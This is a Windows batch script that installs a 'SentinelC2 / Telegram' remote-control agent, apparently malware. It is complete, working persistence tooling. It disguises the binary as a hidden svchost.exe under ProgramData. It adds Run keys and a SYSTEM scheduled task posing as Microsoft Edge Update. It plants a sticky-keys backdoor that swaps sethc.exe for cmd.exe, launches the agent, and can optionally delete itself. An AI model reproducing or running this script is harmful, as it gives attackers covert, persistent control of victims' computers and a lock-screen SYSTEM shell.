@echo off
REM ============================================================================
REM install.cmd - Single-shot installer for the SentinelC2 / Telegram agent.
REM
REM What it does
REM -------------
REM   1. Locates the agent binary (next to this .cmd, or via --agent=<path>).
REM   2. Copies it to a stealthy install path under %ProgramData%.
REM   3. Sets the HKCU Run key (always - no admin needed).
REM   4. If admin: also HKLM Run key, scheduled task, sticky-keys backdoor.
REM   5. Launches the agent.
REM   6. Self-deletes (optional, off by default).
REM
REM Usage
REM -----
REM   install.cmd                                       (uses agent in same dir)
REM   install.cmd --agent="C:\path\to\agent_telegram_prod.exe"
REM   install.cmd --install-dir="C:\Custom\Path"      (admin only, defaults to
REM                                                     %ProgramData%\Microsoft\
REM                                                     Network\Connections\Cm)
REM   install.cmd --no-launch                          (install only, don't run)
REM   install.cmd --self-delete                        (delete this .cmd after run)
REM
REM Requirements
REM ------------
REM   * The agent .exe must be next to this .cmd, or passed via --agent=...
REM   * For full persistence (HKLM, task, sethc) the .cmd must be run from
REM     an elevated cmd. HKCU Run key works without elevation.
REM   * Works on Windows 10 / 11. Test on a VM first.
REM ============================================================================

setlocal EnableExtensions EnableDelayedExpansion

REM --- Parse args --------------------------------------------------------------
set "AGENT_SRC="
set "INSTALL_DIR=C:\ProgramData\Microsoft\Network\Connections\Cm"
set "INSTALL_NAME=svchost.exe"
set "RUN_VALUE=MicrosoftEdgeUpdate"
set "TASK_NAME=MicrosoftEdgeUpdateTaskMachine"
set "LAUNCH=1"
set "SELF_DELETE=0"
set "VERBOSE=1"

for %%A in (%*) do (
    set "ARG=%%~A"
    if /I "!ARG:~0,8!"=="--agent=" (
        set "AGENT_SRC=!ARG:~8!"
    ) else if /I "!ARG!"=="--no-launch" (
        set "LAUNCH=0"
    ) else if /I "!ARG!"=="--self-delete" (
        set "SELF_DELETE=1"
    ) else if /I "!ARG!"=="--quiet" (
        set "VERBOSE=0"
    ) else if /I "!ARG:~0,14!"=="--install-dir=" (
        set "INSTALL_DIR=!ARG:~14!"
    )
)

if "%VERBOSE%"=="1" (
    echo.
    echo  SentinelC2 / Telegram - install.cmd
    echo  =====================================
)

REM --- Resolve agent source ----------------------------------------------------
if "%AGENT_SRC%"=="" (
    REM Default: same directory as this .cmd, with a few common names tried.
    set "AGENT_SRC=%~dp0agent_telegram.exe"
    if not exist "!AGENT_SRC!" set "AGENT_SRC=%~dp0agent_telegram_prod.exe"
    if not exist "!AGENT_SRC!" set "AGENT_SRC=%~dp0agent.exe"
)
if not exist "%AGENT_SRC%" (
    echo  [!] agent not found. Pass --agent=path\to\agent.exe
    echo      (defaulting to: %~dp0agent_telegram.exe)
    exit /b 1
)
for %%F in ("%AGENT_SRC%") do set "AGENT_SIZE=%%~zF"
if %VERBOSE%==1 echo  [+] agent: %AGENT_SRC%  (%AGENT_SIZE% bytes)

REM --- Check admin -------------------------------------------------------------
net session >nul 2>&1
if %errorlevel%==0 (
    set "IS_ADMIN=1"
    if %VERBOSE%==1 echo  [+] admin: yes
) else (
    set "IS_ADMIN=0"
    if %VERBOSE%==1 echo  [+] admin: no  (HKCU Run key only - re-run from elevated cmd for full persistence)
)

REM --- Stage the binary --------------------------------------------------------
REM Strip a trailing backslash if present, then build the full install path.
if "%INSTALL_DIR:~-1%"=="\" set "INSTALL_DIR=%INSTALL_DIR:~0,-1%"
set "INSTALL_PATH=%INSTALL_DIR%\%INSTALL_NAME%"

if not exist "%INSTALL_DIR%" (
    mkdir "%INSTALL_DIR%" >nul 2>&1
    if not exist "%INSTALL_DIR%" (
        echo  [!] could not create %INSTALL_DIR%
        echo      falling back to %APPDATA%\Microsoft\SystemCertificates
        set "INSTALL_DIR=%APPDATA%\Microsoft\SystemCertificates"
        if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
        if not exist "%INSTALL_DIR%" (
            echo  [!] also could not create %APPDATA%\Microsoft\SystemCertificates
            exit /b 1
        )
        set "INSTALL_PATH=%INSTALL_DIR%\%INSTALL_NAME%"
    )
)
copy /Y "%AGENT_SRC%" "%INSTALL_PATH%" >nul
if errorlevel 1 (
    echo  [!] copy to %INSTALL_PATH% failed
    exit /b 1
)
if %VERBOSE%==1 echo  [+] installed: %INSTALL_PATH%

REM Hidden + system file attributes (Windows attrib).
attrib +h +s "%INSTALL_PATH%" >nul 2>&1
if %VERBOSE%==1 echo  [+] attributes: hidden + system

REM --- HKCU Run key (always) ---------------------------------------------------
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%RUN_VALUE%" /t REG_SZ /d "\"%INSTALL_PATH%\"" /f >nul 2>&1
if errorlevel 1 (
    echo  [!] HKCU Run key add failed
) else (
    if %VERBOSE%==1 echo  [+] HKCU\...\Run\%RUN_VALUE% = "%INSTALL_PATH%"
)

REM --- Admin-only: HKLM Run key, scheduled task, sticky-keys ------------------
if "%IS_ADMIN%"=="1" (
    reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "%RUN_VALUE%" /t REG_SZ /d "\"%INSTALL_PATH%\"" /f >nul 2>&1
    if %VERBOSE%==1 echo  [+] HKLM\...\Run\%RUN_VALUE% = "%INSTALL_PATH%"

    REM Scheduled task (SYSTEM, AtLogOn, HighestAvailable, StartWhenAvailable).
    schtasks /Create /SC ONLOGON /RL HIGHEST /RU SYSTEM /TN "%TASK_NAME%" /TR "\"%INSTALL_PATH%\"" /F >nul 2>&1
    if %VERBOSE%==1 echo  [+] scheduled task: %TASK_NAME% (SYSTEM, AtLogOn)

    REM Sticky-keys backdoor: sethc.exe -> cmd.exe (only if not already installed).
    if not exist "%SystemRoot%\System32\sethc.exe.bak" (
        takeown /f "%SystemRoot%\System32\sethc.exe" /a >nul 2>&1
        icacls "%SystemRoot%\System32\sethc.exe" /grant Administrators:F >nul 2>&1
        copy /Y "%SystemRoot%\System32\cmd.exe" "%SystemRoot%\System32\sethc.exe.bak" >nul 2>&1
        copy /Y "%SystemRoot%\System32\cmd.exe" "%SystemRoot%\System32\sethc.exe" >nul 2>&1
        if %VERBOSE%==1 echo  [+] sticky-keys: installed (Shift 5x at lock screen = SYSTEM cmd)
    ) else (
        if %VERBOSE%==1 echo  [+] sticky-keys: already installed
    )
) else (
    if %VERBOSE%==1 echo  [-] admin-only steps skipped (no elevation)
)

REM --- Launch the agent --------------------------------------------------------
if "%LAUNCH%"=="1" (
    REM Start hidden (no console flash). The agent itself is --app:gui so
    REM it has no console anyway, but starting it this way keeps Task Manager's
    REM "command line" column cleaner.
    start "" /B "%INSTALL_PATH%"
    if %VERBOSE%==1 echo  [+] agent launched
    REM Give the agent a moment to acquire its mutex, then check.
    timeout /t 2 /nobreak >nul
)

REM --- Done --------------------------------------------------------------------
if %VERBOSE%==1 (
    echo.
    echo  [+] install complete.
    echo      the agent will appear in your Telegram chat within a few seconds
    echo      of the next user logon (or immediately, since the binary was just started).
    echo.
)

REM --- Self-delete (optional) --------------------------------------------------
if "%SELF_DELETE%"=="1" (
    REM Schedule a deletion of this .cmd via a one-shot cmd that runs after
    REM this process exits. The 'start' is required so the parent exits
    REM cleanly without a "file in use" error.
    start "" /B cmd /c "ping -n 2 127.0.0.1 >nul ^& del /F /Q "%~f0""
)

endlocal
exit /b 0
